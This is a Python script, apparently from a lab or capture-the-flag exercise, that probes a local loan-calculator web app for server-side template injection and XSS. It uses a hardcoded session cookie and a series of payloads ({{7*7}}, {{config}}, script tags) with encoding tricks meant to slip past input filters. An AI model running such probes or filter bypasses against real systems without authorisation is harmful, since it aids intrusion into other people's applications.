import requests
import json
import urllib.parse
import base64

base_url = "http://127.0.0.1:5000"
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVYRkA.NZrGBUBLWhE1H3H_nJGpmrxsh5A"

def test_injection(payload, param_name, description):
    """Test injection payload on /total_loan_payments"""
    print(f"\n=== {description} ===")
    
    params = {
        "principal": "10000",
        "payment": "500",
        "term": "24"
    }
    params[param_name] = payload
    
    cookies = {"session": session_cookie}
    
    try:
        response = requests.get(
            f"{base_url}/total_loan_payments",
            params=params,
            cookies=cookies,
            timeout=10
        )
        
        print(f"URL: {response.url}")
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text[:500]}")
        
        return response
        
    except Exception as e:
        print(f"Error: {e}")
        return None

def compare_with_home(payload, description):
    """Compare behavior with /home endpoint"""
    print(f"\n=== Comparing with /home - {description} ===")
    
    params = {"page": payload}
    cookies = {"session": session_cookie}
    
    try:
        response = requests.get(
            f"{base_url}/home",
            params=params,
            cookies=cookies,
            timeout=10
        )
        
        print(f"URL: {response.url}")
        print(f"Status: {response.status_code}")
        print(f"Response preview: {response.text[:500]}")
        
        # Check if payload executed
        if "49" in response.text and "7*7" not in response.text:
            print("[+] Payload EXECUTED (SSTI working)")
        elif payload in response.text:
            print("[-] Payload reflected but NOT executed")
        else:
            print("[-] Payload blocked")
            
        return response
        
    except Exception as e:
        print(f"Error: {e}")
        return None

# Test 1: Baseline normal request
print("=" * 80)
print("BASELINE TEST")
print("=" * 80)
test_injection("10000", "principal", "Normal parameter value")

# Test 2: Direct SSTI attempt
test_injection("{{7*7}}", "principal", "Direct SSTI injection in principal")
test_injection("{{7*7}}", "payment", "Direct SSTI injection in payment")
test_injection("{{7*7}}", "term", "Direct SSTI injection in term")

# Test 3: URL Encoded SSTI
test_injection(urllib.parse.quote("{{7*7}}"), "principal", "URL-encoded SSTI")

# Test 4: Double URL Encoded SSTI
double_encoded = urllib.parse.quote(urllib.parse.quote("{{7*7}}"))
test_injection(double_encoded, "principal", "Double URL-encoded SSTI")

# Test 5: HTML Entity Encoding
test_injection("&#x7B;&#x7B;7*7&#x7D;&#x7D;", "principal", "HTML Entity encoded SSTI")

# Test 6: Mixed encoding - only encode opening braces
test_injection(urllib.parse.quote("{") + "{" + "7*7" + "}" + urllib.parse.quote("}"), "principal", "Mixed encoding (encoded braces)")

# Test 7: Alternative expression syntax (Jinja comments)
test_injection("{#7*7#}", "principal", "Jinja comment syntax")
test_injection(urllib.parse.quote("{#7*7#}"), "principal", "URL-encoded Jinja comment")

# Test 8: String concatenation attempts
test_injection("{{7" + "*" + "7}}", "principal", "Split expression concatenation")

# Test 9: Character encoding variations
test_injection("{{7\x2a7}}", "principal", "Hex escape in expression")

# Test 10: Null byte injection
test_injection("{{7*7}}%00", "principal", "Null byte after payload")

# Compare with /home endpoint behavior
print("\n" + "=" * 80)
print("COMPARISON WITH /home ENDPOINT BEHAVIOR")
print("=" * 80)

compare_with_home("{{7*7}}", "Direct SSTI on /home")
compare_with_home(urllib.parse.quote("{{7*7}}"), "URL-encoded SSTI on /home")

# Test 11: Check if parameters are being reflected in error messages
print("\n" + "=" * 80)
print("ERROR MESSAGE ANALYSIS")
print("=" * 80)

test_cases = [
    "<script>alert(1)</script>",
    "{{config}}",
    "{{request}}",
    "${7*7}",  # EL expression
    "#{7*7}",  # OGNL/SpEL
]

for payload in test_cases:
    test_injection(payload, "principal", f"Testing: {payload}")

print("\n" + "=" * 80)
print("ANALYSIS COMPLETE")
print("=" * 80)
